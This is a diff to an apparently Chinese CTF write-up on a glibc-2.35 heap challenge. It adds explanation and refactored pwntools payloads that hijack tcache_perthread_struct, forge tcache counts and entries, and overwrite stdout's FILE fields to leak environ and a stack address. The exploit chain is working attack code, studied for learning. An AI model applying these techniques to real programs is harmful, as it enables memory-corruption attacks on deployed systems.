@@ -1322,18 +1322,83 @@ word_bytes = context.word_size // 8 # i386->word_size=32  amd64->word_size=64
 target = 0xf0
 
 # glibc-2.30之前
-offset = 0x10 + 0x40 + (target-0x20)/0x10 * word_bytes
+offset = 0x10 + 0x40 + (target-0x20)//0x10 * word_bytes
 
 # glibc-2.30及以后
-offset = 0x10 + 0x80 + (target-0x20)/0x10 * word_bytes
+offset = 0x10 + 0x80 + (target-0x20)//0x10 * word_bytes
 ```
 本题是glibc-2.35，利用第二个公式，计算出offset为0xf8
-我们将heap_base + 0xf8这里的值覆盖为heap_base + 0x10
-当我们申请0xe0大小的空间时(利用解包过程中会申请与content大小相同的空间)，便会申请到heap_base+0x10开始的写权限
-即可劫持tcache_perthread_struct，实现堆任意分配
+我们将`heap_base + 0xf8`这里的值覆盖为`heap_base + 0x10`
+当我们申请0xe0大小的空间时(利用解包过程中会申请与content大小相同的空间)，便会申请到`heap_base+0x10`开始的写权限
+即可劫持`tcache_perthread_struct`，实现堆任意分配
+
+看看我们改之后的`tcache_perthread_struct`
+```python
+# 伪造counts
+payload  = p16(0)*2+p16(1)+p16(1)+p16(0)*5+p16(1)
+payload  = payload.ljust(0x80,b'\x00')
+
+# 伪造entrtes
+payload += p64(0)*2+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)
+payload  = payload.ljust(0xe0,b"\x00")
+```
+我们将0x40,0x50,0xb0的counts修改为1
+并将对应的0x40,0x50大小的entries改为stdout结构体的位置
+将对应0xb0大小的堆块改为`heap_base+0x10`，以便继续控制`tcache_perthread_struct`
+最后调整为0xe0，在解包过程中，会申请0xf0大小的chunk，也就是`tcache_perthread_struct`，然后将content填进去，也就实现了篡改`tcache_perthread_struct`
 
 ### stdout
-还不熟悉，之后再补上
+```c
+struct _IO_FILE {
+  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;	/* Current read pointer */
+  char* _IO_read_end;	/* End of get area. */
+  char* _IO_read_base;	/* Start of putback+get area. */
+  char* _IO_write_base;	/* Start of put area. */
+  char* _IO_write_ptr;	/* Current put pointer. */
+  char* _IO_write_end;	/* End of put area. */
+  char* _IO_buf_base;	/* Start of reserve area. */
+  char* _IO_buf_end;	/* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+```
+我们将stdout修改成这样
+```python
+payload2 = p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)
+```
+0xFBAD1800是_IO_MAGIC，由libc定义，大部分都是这个值
+我们将_IO_write_base修改为environ，将_IO_write_ptr改为environ+8
+之后便会泄露environ的值
 
 ### environ
 
@@ -1439,15 +1504,30 @@ create(8,p64(0) + p64(heap_base+0x10))
 
 # 解包过程中会申请0xe0的空间存放content，也就是说会申请0xf0大小的chunk，由于我们已经将0xf0大小的chunk的entries指针改为heap_base+0x10
 # 所以我们实际上申请到了heap_base位置的chunk，即tcache_perthread_struct
-do_nothing((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b"\x00"))
+# 伪造counts
+payload  = p16(0)*2+p16(1)+p16(1)+p16(0)*5+p16(1)
+payload  = payload.ljust(0x80,b'\x00')
+
+# 伪造entrtes
+payload += p64(0)*2+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)
+payload  = payload.ljust(0xe0,b"\x00")
+do_nothing(payload)
 
 # leak stack_addr
-do_nothing(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)) 
+payload2 = p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)
+do_nothing(payload2) 
 leak = u64(p.recv(6).ljust(8,b'\x00'))
 stack_addr = leak - 0x1a8 + 0x40
 log.success("stack_addr : " + hex(stack_addr))
 
-do_nothing((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(0)+p64(0)+p64(stack_addr)).ljust(0xa0,b"\x00"))
+# 伪造counts
+payload3  = p16(0)*4+p16(1)
+payload3  = payload3.ljust(0x80,b'\x00')
+
+# 伪造entrtes
+payload3 += p64(0)*4+p64(stack_addr)
+payload3  = payload3.ljust(0xa0,b"\x00")
+do_nothing(payload3)
 
 #gdb.attach(p)
 
